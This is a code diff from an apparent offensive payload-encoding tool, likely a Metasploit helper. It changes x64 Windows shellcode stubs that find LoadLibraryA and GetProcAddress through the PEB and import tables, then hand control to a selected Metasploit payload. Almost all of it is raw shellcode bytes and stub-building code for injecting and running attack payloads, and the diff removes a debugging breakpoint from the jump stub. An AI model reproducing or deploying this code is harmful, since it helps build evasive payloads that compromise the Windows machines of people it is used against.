@@ -616,72 +616,79 @@ class stubs_64:
 
         shellcode = bytes(
                 "\xfc"                                              # cld 
-                "\x48\x83\xE4\xF0"                                  # and rsp, 0xfffffffffffffff0
-                #"\x48\x83\xEC\x20"                                 # sub rsp, 20
-                "\x41\x51"                                          # push r9
-                "\x41\x50"                                          # push r8
                 "\x52"                                              # push rdx
                 "\x51"                                              # push rcx
+                "\x57"                                              # push rdi
+                "\x53"                                              # push rbx
                 "\x56"                                              # push rsi
+                "\x41\x50"                                          # push r8
+                "\x41\x51"                                          # push r9
+                "\x41\x54"                                          # push r12
+                "\x41\x55"                                          # push r13
+                "\x41\x56"                                          # push r14
+                "\x41\x57"                                          # push r15
                 "\x48\x31\xd2"                                      # xor rdx, rdx
                 "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
                 "\x48\x8b\x52\x10"                                  # mov rdx, qword ptr [rdx + 0x10]
-                "\x48\x89\xd3"                                      # mov rbx, rdx
+                "\x49\x89\xd5"                                      # mov r13, rdx
                 "\x8b\x42\x3c"                                      # mov eax, dword ptr [rdx + 0x3c]
                 "\x48\x01\xc2"                                      # add rdx, rax
                 "\x8b\xba\x90\x00\x00\x00"                          # mov edi, dword ptr [rdx + 0x90]
-                "\x48\x01\xdf"                                      # add rdi, rbx
+                "\x4c\x01\xef"                                      # add rdi, r13
                 "\x8b\x57\x0c"                                      # mov edx, dword ptr [rdi + 0xc]
-                "\x48\x01\xda"                                      # add rdx, rbx
+                "\x4c\x01\xea"                                      # add rdx, r13
                 "\x81\x3a\x4b\x45\x52\x4e"                          # cmp dword ptr [rdx], 0x4e52454b
-                "\x75\x09"                                          # jne 0x3e
+                "\x75\x09"                                          # jne 0x47
                 "\x81\x7a\x04\x45\x4c\x33\x32"                      # cmp dword ptr [rdx + 4], 0x32334c45
-                "\x74\x06"                                          # je 0x44
+                "\x74\x06"                                          # je 0x4d
                 "\x48\x83\xc7\x14"                                  # add rdi, 0x14
-                "\xeb\xe3"                                          # jmp 0x27
+                "\xeb\xe3"                                          # jmp 0x30
                 "\x57"                                              # push rdi
-                "\xeb\x46"                                          # jmp 0x8d
+                "\xeb\x47"                                          # jmp 0x97
                 "\x8b\x57\x10"                                      # mov edx, dword ptr [rdi + 0x10]
-                "\x48\x01\xda"                                      # add rdx, rbx
+                "\x4c\x01\xea"                                      # add rdx, r13
                 "\x8b\x37"                                          # mov esi, dword ptr [rdi]
-                "\x48\x01\xde"                                      # add rsi, rbx
+                "\x4c\x01\xee"                                      # add rsi, r13
                 "\x48\x89\xd1"                                      # mov rcx, rdx
                 "\x48\x81\xc1\x00\x00\xff\x00"                      # add rcx, 0xff0000
-                "\x48\x31\xed"                                      # xor rbp, rbp
+                "\x4d\x31\xdb"                                      # xor r11, r11
                 "\x8b\x06"                                          # mov eax, dword ptr [rsi]
-                "\x48\x01\xd8"                                      # add rax, rbx
+                "\x4c\x01\xe8"                                      # add rax, r13
                 "\x48\x83\xc0\x02"                                  # add rax, 2
                 "\x48\x39\xc1"                                      # cmp rcx, rax
-                "\x72\x17"                                          # jb 0x84
+                "\x72\x17"                                          # jb 0x8d
                 "\x48\x39\xd0"                                      # cmp rax, rdx
-                "\x72\x12"                                          # jb 0x84
+                "\x72\x12"                                          # jb 0x8d
                 "\x8b\x7c\x24\x08"                                  # mov edi, dword ptr [rsp + 8]
                 "\x39\x38"                                          # cmp dword ptr [rax], edi
-                "\x75\x0a"                                          # jne 0x84
+                "\x75\x0a"                                          # jne 0x8d
                 "\x8b\x7c\x24\x10"                                  # mov edi, dword ptr [rsp + 0x10]
                 "\x39\x78\x08"                                      # cmp dword ptr [rax + 8], edi
-                "\x75\x01"                                          # jne 0x84
+                "\x75\x01"                                          # jne 0x8d
                 "\xc3"                                              # ret 
-                "\x83\xc5\x04"                                      # add ebp, 4
+                "\x41\x83\xc3\x04"                                  # add r11d, 4
                 "\x48\x83\xc6\x04"                                  # add rsi, 4
-                "\xeb\xd2"                                          # jmp 0x5f
+                "\xeb\xd1"                                          # jmp 0x68
                 "\x68\x61\x72\x79\x41"                              # push 0x41797261
                 "\x68\x4c\x6f\x61\x64"                              # push 0x64616f4c
-                "\xe8\xab\xff\xff\xff"                              # call 0x47
-                "\x48\x01\xea"                                      # add rdx, rbp
+                "\xe8\xaa\xff\xff\xff"                              # call 0x50
+                "\x4c\x01\xda"                                      # add rdx, r11
                 "\x48\x83\xc4\x10"                                  # add rsp, 0x10
                 "\x5f"                                              # pop rdi
                 "\x52"                                              # push rdx
                 "\x68\x64\x64\x72\x65"                              # push 0x65726464
                 "\x68\x47\x65\x74\x50"                              # push 0x50746547
-                "\xe8\x93\xff\xff\xff"                              # call 0x47
-                "\x48\x01\xea"                                      # add rdx, rbp
-                "\x5d"                                              # pop rbp
-                "\x5d"                                              # pop rbp
-                "\x5b"                                              # pop rbx
-                "\x48\x89\xd5"                                      # mov rbp, rdx
+                "\xe8\x92\xff\xff\xff"                              # call 0x50
+                "\x4c\x01\xda"                                      # add rdx, r11
+                "\x59"                                              # pop rcx
+                "\x59"                                              # pop rcx
+                "\x41\x5e"                                          # pop r14
+                "\x49\x89\xd7"                                      # mov r15, rdx
 
+                # LLA in r14
+                # GPA in r15
                 , 'iso-8859-1')
+
         return shellcode
 
     def gpa_parser_stub(self):
@@ -1680,19 +1687,19 @@ class x86_windows_metasploit:
             table_offset = len(self.stub) - len(self.lookup_table)
             
             self.stub += b"\x33\xC0"                            # XOR EAX,EAX                    ; clear eax
-            self.stub += b"\xE8\x00\x00\x00\x00"                # CALL $+5                       ; get PC
-            self.stub += b"\x5E"                                # POP ESI                        ; current EIP loc in ESI                   
-            self.stub += b"\x8B\x8E"                            # MOV ECX, DWORD PTR [ESI+XX]    ; MOV 1st Hash into ECX
+            #GET PC
+            self.stub += b"\x48\x8d\x35\x00\x00\x00\x00"        # lea rsi, [rip]
+            self.stub += b"\x8B\x8E"                            # MOV ECX, DWORD PTR [RSI+XX]    ; MOV 1st Hash into ECX
             
             # updated offset
-            updated_offset = 0xFFFFFFFF - len(self.stub) - table_offset + 14 
+            updated_offset = 0xFFFFFFFF - len(self.stub) - table_offset + 13 
             
             # Check_hash
-            self.stub += struct.pack("<I", 0xffffffff-len(self.stub) - table_offset + 14)
+            self.stub += struct.pack("<I", 0xffffffff-len(self.stub) - table_offset + 13)
             self.stub += b"\x44\x39\xD1"                        # CMP ecx, r10d  
             
             self.stub += b"\x74\x06"                            # JE SHORT 001C01a1              ; if equal, jmp to found_a_match
-            self.stub += b"\x48\x83\xC6\x06"                        # ADD RSI,6                      ; else increment to next hash
+            self.stub += b"\x48\x83\xC6\x06"                    # ADD RSI,6                      ; else increment to next hash
             # I think this is the right updated length
             self.stub += b"\xEB\xEF"                            # JMP SHORT 001C0191             ; repeat
             # FOUND_A_MATCH
@@ -1700,9 +1707,9 @@ class x86_windows_metasploit:
             self.stub += struct.pack("<I", updated_offset + 4)
             self.stub += b"\x8A\xC1"                            # MOV AL,CL                      ; OFFSET in CL, mov to AL
             # Get DLL and Call LLA for DLL Block
-            self.stub += b"\x48\x89\xF1"                            # MOV RCX,RSI                    ; mov offset to ecx
-            self.stub += b"\x48\x01\xC1"                            # ADD RCX,RAX                    ; find DLL location
-            self.stub += b"\x48\x81\xE9"                            # SUB RCX,XX                     ; normalize for ascii value
+            self.stub += b"\x48\x89\xF1"                        # MOV RCX,RSI                    ; mov offset to ecx
+            self.stub += b"\x48\x01\xC1"                        # ADD RCX,RAX                    ; find DLL location
+            self.stub += b"\x48\x81\xE9"                        # SUB RCX,XX                     ; normalize for ascii value
             self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff +3))
             
             sys.stderr.write("Test: {0}".format(self.DLL_INFO['importname']))
@@ -1722,7 +1729,7 @@ class x86_windows_metasploit:
      
             
             self.stub += b"\x48\x83\xEC\x20"                        # sub rsp, 0x20
-            self.stub += b"\xFF\x13"                                # CALL DWORD PTR DS:[RBX]        ; Call KERNEL32.LoadLibraryA (DLL)
+            self.stub += b"\x41\xFF\x16"                                # CALL QWORD PTR DS:[r14]        ; Call KERNEL32.LoadLibraryA (DLL)
             # Get API and Call GPA
             
             self.stub += b"\x48\x89\xC2"                            # MOV RDX,RAX                    ; Save DLL Handle to EDX
@@ -1739,37 +1746,52 @@ class x86_windows_metasploit:
             self.stub += b"\x8B\x8E"                            # MOV ECX,DWORD PTR DS:[ESI-XX]  ; Put API Offset in ECX
             self.stub += struct.pack("<I", updated_offset + 4)  
             self.stub += b"\x8A\xC5"                            # MOV AL,CH                      ; mov API offset to ECX
-            self.stub += b"\x48\x89\xF1"                            # MOV RCX,RSI                    ; mov offset to ecx
+            self.stub += b"\x48\x89\xF1"                        # MOV RCX,RSI                    ; mov offset to ecx
             self.stub += b"\x48\x01\xC1"                        # ADD ECX,EAX                    ; find API location
-            self.stub += b"\x48\x81\xE9"                            # SUB ECX,XX                     ; normalize for ascii value
+            self.stub += b"\x48\x81\xE9"                        # SUB ECX,XX                     ; normalize for ascii value
             self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff + 4))
-            self.stub += b"\x48\x87\xD1"                            # xchg rcx, rdx                  ; Use the proper registers for gpa
-            self.stub += b"\x48\x83\xEC\x20"                        # sub rsp, 0x20
-            self.stub += b"\x3E\xFF\x55\x00"                        # CALL DWORD PTR DS:[RBP]        ; Call Getprocaddress(DLL.handle, API)
+            self.stub += b"\x48\x87\xD1"                        # xchg rcx, rdx                  ; Use the proper registers for gpa
+            self.stub += b"\x48\x83\xEC\x20"                    # sub rsp, 0x20
+            self.stub += b"\x41\xFF\x17"                        # CALL QWORD PTR DS:[r15]        ; Call Getprocaddress(DLL.handle, API)
             # Call API RAX has API
             #Stopped here
             # now I need to track the stack
             # restore stuff stack and return
-            #self.stub += b"\x89\x44\x24\x1C"                    # MOV DWORD PTR SS:[ESP+1C],EAX  ; SAVE EAX for popad ends up in eax
-            #self.stub += b"\x61"                                # POPAD                          ; Restore registers and call values
-            self.stub += b"\x48\x83\xC4\x40"                     # SUB RSP, 48
-            self.stub += b"\x5E"                                 # pop rsi
-            self.stub += b"\x59"                                 # pop rcx
-            self.stub += b"\x5A"                                 # pop rdx
-            self.stub += b"\x41\x58"                             # pop r8
-            self.stub += b"\x41\x59"                             # pop r9
-            self.stub += b"\x48\x8B\x6C\x24\x20"                 # mov rbp, [rsp+0x20]                        ; get return addr
-            self.stub += b"\xFF\xD0"                             # CALL RAX                       ; call target API
+            self.stub += b"\x48\x83\xC4\x40"                     # SUB RSP, 40
+            
+            self.stub += b"\x41\x5f"                 #  pop    r15
+            self.stub += b"\x41\x5e"                 #  pop    r14
+            self.stub += b"\x41\x5d"                 #  pop    r13
+            self.stub += b"\x41\x5c"                 #  pop    r12
+            self.stub += b"\x41\x59"                 #  pop    r9
+            self.stub += b"\x41\x58"                 #  pop    r8
+            self.stub += b"\x5e"                     # pop    rsi
+            self.stub += b"\x5b"                     # pop    rbx
+            self.stub += b"\x5f"                     # pop    rdi
+            self.stub += b"\x59"                     # pop    rcx
+            self.stub += b"\x5a"                     # pop    rdx
+            #self.stub += b"\x5B"                                     # pop rbx
+            #self.stub += b"\x41\x5D"                                 # pop r13
+            #self.stub += b"\x5e"                                     # pop    rsi
+            #self.stub += b"\x59"                                     # pop    rcx
+            #self.stub += b"\x5a"                                     # pop    rdx
+            #self.stub += b"\x41\x58"                                 # pop    r8
+            #self.stub += b"\x41\x59"                                 # pop    r9
+            self.stub += b"\x5D"                                     # pop    rbp (save return addr)
+            self.stub += b"\x48\x83\xE4\xF0"                         # and rsp, 0xfffffffffffffff0 ; align the stack
+            self.stub += b"\x48\x83\xEC\x20"                         # sub rsp, 0x20
+            
+            self.stub += b"\xFF\xD0"                                 # CALL RAX                       ; call target API
             # Recover
+            
             self.stub += b"\x55"                                 # push rbp                       ; push return addr into msf caller
-            self.stub += b"\xe8\x00\x00\x00\x00"                 # call $+5                       ; get pc
-            self.stub += b"\x5D"                                 # POP RBP                        ; current EIP in EBP
+            self.stub += b"\x48\x8D\x2D\x00\x00\x00\x00"         # lea rbp, [rip]                   ; get pc
             self.stub += b"\x48\x81\xED"                         # SUB RBP,XX                     ; To reset the location of the api call back
-            self.stub += struct.pack("<I", len(self.selected_payload)+ len(self.stub) -4)   
+            self.stub += struct.pack("<I", len(self.selected_payload) + len(self.stub) - 3)   
             self.stub += b"\xC3"                                 # RETN                           ; return back into msf payload logic
 
 
-            self.jump_stub = b"\xcc\xe8"
+            self.jump_stub = b"\xe8"
             self.jump_stub += struct.pack("<I", len(self.selected_payload) + len(self.stub))
         
 
